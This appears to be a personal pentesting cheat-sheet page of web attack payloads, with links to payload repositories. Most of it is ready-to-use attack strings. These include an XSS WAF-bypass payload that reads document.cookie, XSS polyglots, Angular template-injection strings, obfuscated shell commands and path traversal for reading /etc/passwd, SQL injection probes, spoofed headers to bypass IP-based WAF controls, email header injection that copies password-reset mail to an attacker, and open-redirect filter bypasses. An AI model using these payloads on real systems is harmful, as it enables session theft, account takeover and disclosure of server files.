---
title: Out of the Box - Payloads
date: 2022-07-23 00:00:00
---

## Payload Lists
https://github.com/swisskyrepo/PayloadsAllTheThings
https://github.com/cujanovic/Markdown-XSS-Payloads
https://github.com/pwntester/ysoserial.net
https://github.com/swisskyrepo/PayloadsAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/API%20Key%20Leaks (APIs)
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3 (AWS Buckets)
http://www.xss-payloads.com


## Payload keys
XSS Ideas
```
XSS poliglota:
https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

Cross Site Scripting (XSS) Akamai WAF Bypass
<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
```

```javascript
jQuery Version:
alert(jQuery.fn.jquery);

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

Angular:
```
{{constructor.constructor('alert(1)')()}}
{{constructor.constructor('alert(/XSS Stored!/)')()}}
1023+1 ou {{1023+1}}
```

Reading /etc/passwd File:
```
1) cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??
2) ??n/??t$IFS/?tc/????wd
3) ??n${PATH%%[a-z]*}??t$IFS${PATH%%[a-z]*}??c${PATH%%u*}?????d
4) ../../../../../../../../../../../../etc/passwd

Explantion:
$'\x41' => 'A' (HEX)
$'\U41' => 'A'  (HEX Unicode)
$'\101' => 'A' (Octal)
```

SQL Ideas:
```
1+OR/AND+1=1 and sELeCt/*Test*/1 and so .

/?id=1%27%20AND%20%271%27=LENGTH(%27;%27)%20--+
/?id=1%27%20AND%20%271%27=LENGTH(%27;;%27)%20--+

/?id=1%27%20AND%20%271%27=STRCMP(%22;%22,%20%22;%22);%20--+
/?id=1%27%20AND%20%271%27=STRCMP(%22;;%22,%20%22;%22);%20--+

/?id=1%27%20AND%20%271%27=(sELecT%20@LOL:=1)%20--+
/?id=1%27%20AND%20%271%27=(sELecT%20@LOL:=12)%20--+
```

Some SQLMap Commands to start:
```
...working in progress...
```

WAF - ByPass Controle por IP
```
X-Originating-IP:localhost
X-Forwarded-For:localhost
X-Remote-IP:localhost
X-Remote-Addr:localhost
X-Forwarded-Host:localhost
X-Client-IP:localhost
X-Remote-IP:localhost
X-Remote-Addr:localhost
X-Host:localhost
True-Client-Ip:localhost
```

Forget Password Testing ( Method 10 ) ==> #WayToInjection
Play With Email Header Injection.
```
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```

Open redirect/SSRF payload generator
https://tools.intigriti.io/redirector/
```
basic payloads
https://google.com/redirect.php?redirect=https:/facebook.com
https://google.com/redirect.php?redirect=https://facebook.com
https://google.com/redirect.php?redirect=http:/\/\facebook.com
https://google.com/redirect.php?redirect=https:/\facebook.com
https://google.com/redirect.php?redirect=#facebook.com
https://google.com/redirect.php?redirect=#%20@facebook.com
https://google.com/redirect.php?redirect=/facebook.com

URL encoding
https://google.com/redirect.php?redirect=%2Ffacebook.com
https://google.com/redirect.php?redirect=%2F%2Ffacebook.com
https://google.com/redirect.php?redirect=https%3A%2F%2Ffacebook.com

CRLF
https://google.com/redirect.php?redirect=%0D%0A/facebook.com

a whitelisted domain or keyword
https://google.com/redirect.php?redirect=google.com.facebook.com
https://google.com/redirect.php?redirect=google.comfacebook.com

"https:" to bypass "//" blacklisted keyword
https://google.com/redirect.php?redirect=https:facebook.com

"\/" to bypass "//" blacklisted keyword
https://google.com/redirect.php?redirect=\/\/facebook.com/
https://google.com/redirect.php?redirect=/\/facebook.com/

parameter pollution
https://google.com/redirect.php?redirect=?next=google.com&next=facebook.com

"@" character, browser will redirect to anything after the "@"
https://google.com/redirect.php?redirect=@facebook.com

"//" to bypass "http" blacklisted keyword
https://google.com/redirect.php?redirect=//facebook.com
https://google.com/redirect.php?redirect=
https://google.com/redirect.php?redirect=

Right to Left Override
https://google.com/redirect.php?redirect=%40%E2%80%AE@moc.koobecaf

null byte %00 to bypass blacklist filter
https://google.com/redirect.php?redirect=facebook%00.com

'%E3%80%82' or '。' to bypass '.' blacklisted character
https://google.com/redirect.php?redirect=facebook%E3%80%82com
https://google.com/redirect.php?redirect=facebook。com
```
Insecure Deserialization
```
Payloads: https://github.com/pwntester/ysoserial.net
Json insercure deserialization: https://medium.com/r3d-buck3t/insecure-deserialization-with-json-net-c70139af011a
```